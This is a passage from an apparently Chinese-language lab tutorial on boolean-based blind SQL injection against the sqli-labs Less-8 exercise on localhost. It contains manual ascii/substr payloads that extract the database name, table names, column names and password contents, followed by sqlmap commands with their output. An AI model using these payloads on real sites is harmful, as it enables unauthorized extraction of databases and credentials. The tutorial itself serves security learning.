<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">	and</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> (ascii(substr(database(),1,1)))&gt;115%23 通过不断测试，确定ascii值，查看asciii表可以得出该字符，</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">	通过改变database（）后面第一个数字，可以往后继续猜测第二个、第三个字母…</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">3、猜测表名：</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">	and</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> (ascii(substr((select </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">table_name</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> from</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> information_schema.tables</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> where</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> table.schema=database</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">() </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">limit</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">,1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)1,1)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">144%23 </span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">	往后继续猜测第二个、第三个字母…</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">4、猜测字段名（列名）：</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">	and</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> (ascii(substr((select </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">column_name</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> from</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> information_schema.columns</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> where</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> table.schema=database</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">() </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">and</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> table_name=’数据库表名’</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> limit</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 0</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">,1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)1,1)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">105%23 </span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">	经过猜测</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> ascii为105为i也就是表的第一个列名id的第一个字母</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">;</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">	同样,通过修改</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> limit</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 0</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">,1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> 获取第二个列名</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> 修改后面1,1的获取当前列的其他字段.</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">5、猜测字段内容：</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">	因为知道了列名，所以直接</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> select</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> password</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> from</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> users</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> 就可以获取password里面的内容，username也一样</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> </span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">	and</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> (ascii(substr(( </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">select</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> password</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> from</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> users</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> limit</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 0</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">,1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">),1,1)))=68--+</span></span></code></pre></div><p>比如我当前使用的环境是level-8的</p><p><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507000113567.png" alt="image-20240507000113567"></p><ol><li>判断一下当前的数据库名的长度，如下测试到8是回显正常。</li></ol><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; and length(database()) =8 --+</span></span></code></pre></div><ol start="2"><li>然后猜测当前的数据库名（使用ascii码来依次判断）</li></ol><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">http</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">//</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">localhost</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">Less</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">8</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">index</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">php</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">?id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">’ </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">and</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> ascii</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(substr((</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">database</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">()),</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">115</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">23</span><span style="--shiki-light:#6A737D;--shiki-dark:#768390;"> --+</span></span></code></pre></div><p>但是这样子非常的浪费时间，所以这里可以直接使用工具sqlmap爆破：</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">┌──(root㉿Seso</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)-[~]</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">└─#</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> &quot;http://localhost/Less-8/index.php?id=1&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> --batch</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> --current-db</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">sqlmap</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> identified</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> the</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> following</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> injection</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> point</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">s</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">with</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> a</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> total</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> of</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 255</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> HTTP</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">s</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">requests:</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">---</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">Parameter:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> id</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> (GET)</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">    Type:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> boolean-based</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> blind</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">    Title:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> AND</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> boolean-based</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> blind</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> -</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> WHERE</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> or</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> HAVING</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> clause</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">    Payload:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> id=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; AND 9480=9480 AND &#39;rwkp&#39;=&#39;rwkp</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">    Type:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> time-based</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> blind</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">    Title:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> MySQL</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> &gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 5.0</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">.12</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> AND</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> time-based</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> blind</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> (query </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">SLEEP</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">    Payload:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> id=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; AND (SELECT 3028 FROM (SELECT(SLEEP(5)))VwWo) AND &#39;vqIt&#39;=&#39;vqIt</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">---</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:26:27] [INFO] the back-end DBMS is MySQL</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">web</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> server</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> operating</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> system:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> Linux</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> Ubuntu</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">web</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> application</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> technology:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> PHP</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 5.5</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">.9,</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> Apache</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 2.4</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">.7</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">back-end</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> DBMS:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> MySQL</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> &gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 5.0</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">.12</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:26:27] [INFO] fetching current database</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:26:27] [WARNING] running </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">in</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> a single-thread mode. Please consider usage of option </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;--threads&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> for</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> faster data retrieval</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:26:27] [INFO] retrieved: security</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">current</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> database:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> &#39;security&#39;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:26:28] [INFO] fetched data logged to text files under </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;/root/.local/share/sqlmap/output/localhost&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">*</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">] ending @ 00:26:28 /2024-05-07/</span></span></code></pre></div><p>然后可以查询到当前的数据库名为security。</p><p>查询一下当前的数据库有哪些数据表，可以继续使用sqlmap工具爆破：</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">┌──(root㉿Seso</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)-[~]</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">└─#</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> &quot;http://localhost/Less-8/?id=1&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> --batch</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> security</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> --tables</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">sqlmap</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> identified</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> the</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> following</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> injection</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> point</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">s</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">with</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> a</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> total</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> of</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 255</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> HTTP</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">s</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">requests:</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">---</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">Parameter:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> id</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> (GET)</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">    Type:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> boolean-based</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> blind</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">    Title:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> AND</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> boolean-based</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> blind</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> -</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> WHERE</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> or</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> HAVING</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> clause</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">    Payload:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> id=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; AND 8575=8575 AND &#39;eElN&#39;=&#39;eElN</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">    Type:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> time-based</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> blind</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">    Title:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> MySQL</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> &gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 5.0</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">.12</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> AND</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> time-based</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> blind</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> (query </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">SLEEP</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">    Payload:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> id=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; AND (SELECT 8490 FROM (SELECT(SLEEP(5)))oSnA) AND &#39;AGxQ&#39;=&#39;AGxQ</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">---</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:30:23] [INFO] the back-end DBMS is MySQL</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">web</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> server</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> operating</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> system:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> Linux</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> Ubuntu</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">web</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> application</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> technology:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> Apache</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 2.4</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">.7,</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> PHP</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 5.5</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">.9</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">back-end</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> DBMS:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> MySQL</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> &gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 5.0</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">.12</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:30:23] [INFO] fetching tables </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">for</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> database: </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;security&#39;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:30:23] [INFO] fetching number of tables </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">for</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> database </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;security&#39;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:30:23] [WARNING] running </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">in</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> a single-thread mode. Please consider usage of option </span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;--threads&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> for</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> faster data retrieval</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:30:23] [INFO] retrieved: 4</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:30:23] [INFO] retrieved: emails</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:30:23] [INFO] retrieved: referers</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:30:23] [INFO] retrieved: uagents</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">:30:23] [INFO] retrieved: users</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">Database:</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> security</span></span>
